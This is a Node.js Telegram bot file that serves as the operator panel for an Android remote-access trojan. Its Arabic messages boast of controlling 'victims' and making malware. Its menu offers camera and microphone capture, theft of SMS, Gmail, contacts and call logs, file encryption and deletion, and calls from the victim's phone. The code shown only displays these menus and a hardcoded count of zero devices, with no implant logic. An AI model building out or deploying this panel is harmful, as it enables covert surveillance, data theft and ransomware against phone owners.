import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import express from 'express';

const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const TOKEN = config.token;
const DEVELOPER_ID = config.developerId;

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

const startMessage = `<b>✯ اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 1 ✯</b>

بوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم باي هاتف أندرويد 
تم تطوير البوت من قبل الهكر • 𓆩𖡡𓏺𐏓َِ ч є х σ 𓏺𖡡𓆪 •  تم تطويره لاجل التسليه والراقابه الابوايه فل المطور لا يتحمل مسؤولية سو استخدمه فيما يغضب الله @S7_MX3 

تواصل بل المطور : @V2P_1`;

const aboutMessage = `<b>✯ نحن الجيش اليمني السيبراني نخترق 
نصنع برمجيات خبيثه لاختراق الاجهزه ✯</b>

𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @V2P_1
𝙲𝙷𝙰𝙽𝙽𝙴𝙻 → https://t.me/S7_MX3`;

app.get('/', (req, res) => {
  res.send('تم رفع الخادم معا تحيات المطور • 𓆩𖡡𓏺𐏓َِ ч є х σ 𓏺𖡡𓆪 •');
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (chatId !== DEVELOPER_ID) {
    bot.sendMessage(chatId, '⚠️ هذا البوت للمطور فقط');
    return;
  }
  bot.sendMessage(chatId, startMessage, {
    parse_mode: 'HTML',
    reply_markup: {
      keyboard: [
        ['✯ قائمة التحكم ✯', '✯ عدد الاجهزه ✯'],
        ['✯ معلومات عن المطور ✯']
      ],
      resize_keyboard: true
    }
  });
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  if (chatId !== DEVELOPER_ID) return;
  if (text === '✯ معلومات عن المطور ✯') {
    bot.sendMessage(chatId, aboutMessage, { parse_mode: 'HTML' });
  }
  if (text === '✯ عدد الاجهزه ✯') {
    bot.sendMessage(chatId, '📱 عدد الاجهزه المتصله: 0', { parse_mode: 'HTML' });
  }
  if (text === '✯ قائمة التحكم ✯') {
    bot.sendMessage(chatId, '📋 قائمة التحكم\n\n📸 كيمرا خلفيه 📸\n📸 كيمرا اماميه 📸\n📺 لقطة شاشة 📺\n📞 سجل المكالمات 📞\n📒 سحب جهات الاتصال 📒\n📳 اهتزاز 📳\n🎙 تسجيل صوت 🎙\n📂 عرض جميع الملفات 📂\n💬 سحب الرسائل 💬\n📧 سحب رسائل جيميل 📧\n⚠️ تشفير الملفات ⚠️\n‼ اشعار صفارة ‼\n🛑 ايقاف الاشعارات 🛑\n😎 اضهار رسائل الشاشة 😎\n📽 التطبيقات 📽\n☎️ اتصال من هاتف الضحيه ☎️\n🎬 سحب جميع الملفات 🎬\n✯ حذف الملفات ✯', { parse_mode: 'HTML' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`JEXO BOT RUNNING ON PORT ${PORT}`);
});
